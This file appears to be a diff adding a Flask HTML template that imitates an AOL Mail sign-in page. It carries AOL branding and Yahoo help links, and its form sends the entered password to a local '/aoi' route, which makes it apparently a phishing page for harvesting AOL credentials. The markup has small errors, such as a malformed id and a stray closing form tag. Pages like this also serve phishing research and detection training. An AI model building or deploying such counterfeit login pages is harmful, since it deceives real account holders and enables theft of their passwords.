@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AOL</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/edit.css') }}">
+</head>
+<body>
+    
+    <main id="main1">
+        <section id="s1">
+
+            <div id="d1">
+
+                <ul id=""ul1>
+                    <img id="image1" href="https://in.yahoo.com/" src="{{ url_for('static', filename='image/aol1.png') }}" alt="" height="100px" width="95px">
+                </ul>
+                
+                <ul id="ul2">
+                    <a id="a1" href="https://in.help.yahoo.com/kb/account">Help</a>                    
+                </ul>
+               
+                </div>
+                
+        </section>
+
+        <section id="s2">
+
+            <div id="d2">
+
+                <div id="d3">
+
+                    <h1> AOL MAIL <b><br>your world.</b> </h1>
+                
+                    <p id="p1">Best in class AOL Mail, breaking local, national and global <br>news, finance, sports, music, movies and more. You egt more <br>  out of the web, you get more out of life</p>
+                    
+                </div>
+
+
+                <div id="divf">
+
+
+                
+        
+
+                    <form id="f1" action="/aoi" method="POST">
+                        <div id="d4">
+                            <img id="image2" src="{{ url_for('static', filename='image/aol1.png') }}" height="80px" width="15px" alt=""><br><br>
+                        </div>
+                    
+                        <h1 id="h1">Sign in</h1>
+                    
+                        <p id="p2">Sign in using your AOL account</p>
+                    
+                        <div>
+                            <!-- Use 'password' as the name for the input -->
+                            <input id="user" type="password" name="password" placeholder="Password" required><br>
+                            <hr id="hr1" width="100%">
+                        </div>
+                    
+                        <div>
+                            <button id="b1" type="submit">
+                                <b>Next</b>
+                            </button>
+                        </div>
+                    </form>
+                    
+
+
+
+
+
+
+
+
+
+
+                    </form>
+                </div>
+                
+        
+            </div>
+
+            
+           
+
+
+        </section> 
+    </main>
+    
+</body>
+</html>
